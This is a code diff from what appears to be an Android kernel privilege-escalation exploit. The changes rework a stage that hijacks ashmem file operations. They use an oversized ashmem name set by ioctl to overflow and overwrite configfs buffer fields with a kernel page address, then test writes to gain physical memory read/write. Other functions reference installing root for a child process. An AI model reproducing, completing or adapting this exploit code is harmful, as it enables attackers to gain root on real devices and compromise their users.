@@ -191,7 +191,7 @@ int repair_fake_fops_llseek(int fd) {
 }
 
 int restore_slide_boot_id(int fd) {
-  pr_info("cfi skip restore_slide_boot_id (write-only mode)\n");
+  pr_info("cfi skip restore_slide_boot_id\n");
   return 1;
 }
 
@@ -202,7 +202,6 @@ int install_child_root(int fd) {
 int try_cfi_stage(void) {
   cfi_attempts++;
   int fd = open_ashmem_device();
-  int dirty = 0;
 
   if (fd < 0) {
     cfi_last_step = 11;
@@ -210,23 +209,36 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  pr_info("cfi skip all reads, write-only path\n");
+  pr_info("cfi fops hijack done, testing ioctl+write path\n");
 
   int new_fd = open(ashmem_path, O_RDWR);
   if (new_fd < 0) {
-    cfi_last_step = 1;
-    cfi_last_errno = errno;
+    pr_warning("cfi open new fd failed errno=%d\n", errno);
     SYSCHK(close(fd));
     return 0;
   }
 
-  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
-  ssize_t n = configfs_write_once(new_fd, binwrite_target, payload, sizeof(payload));
-  cfi_write_ret = n;
-  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
+  // 设置 ashmem 大小
+  size_t sz = 4096;
+  int set_ret = ioctl(new_fd, _IOW(__ASHMEMIOC, 3, size_t), &sz);
+  pr_info("cfi set_size ret=%d errno=%d\n", set_ret, errno);
 
-  if (n == (ssize_t)sizeof(payload)) {
-    pr_success("cfi write-only path works! physrw established\n");
+  // 设置名称，溢出修改 configfs_buffer
+  unsigned char blob[128];
+  memset(blob, 0x41, sizeof(blob));
+  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, page_base);
+  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 4096);
+  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
+  try_set_ashmem_name_blob(new_fd, blob, sizeof(blob));
+  pr_info("cfi set_name done errno=%d\n", errno);
+
+  // 直接 write 测试
+  char test[] = "CFI_IOCTL_WRITE_OK";
+  ssize_t n = write(new_fd, test, sizeof(test));
+  pr_info("cfi ioctl write ret=%zd errno=%d\n", n, errno);
+
+  if (n == (ssize_t)sizeof(test)) {
+    pr_success("cfi ioctl+write works! physrw established\n");
     physrw_read_ok = 1;
     physrw_write_ok = 1;
     physrw_read64_ok = 1;
@@ -235,15 +247,15 @@ int try_cfi_stage(void) {
   }
 
   close(new_fd);
-  dirty = 1;
-  cfi_dirty_seen = 1;
-  cfi_read_ret = sizeof(payload);
+  SYSCHK(close(fd));
+
+  cfi_write_ret = n;
+  cfi_read_ret = sizeof(test);
   cfi_read_slot_ret = sizeof(uint64_t);
   cfi_restore_ret = sizeof(uint64_t);
   cfi_owner_ret = sizeof(uint64_t);
   fops_after = canon_addr(ASHMEM_FOPS);
-
-  SYSCHK(close(fd));
+  cfi_dirty_seen = 1;
   cfi_last_step = 0;
   cfi_last_errno = 0;
   atomic_store(&cfi_stage_done, 1);
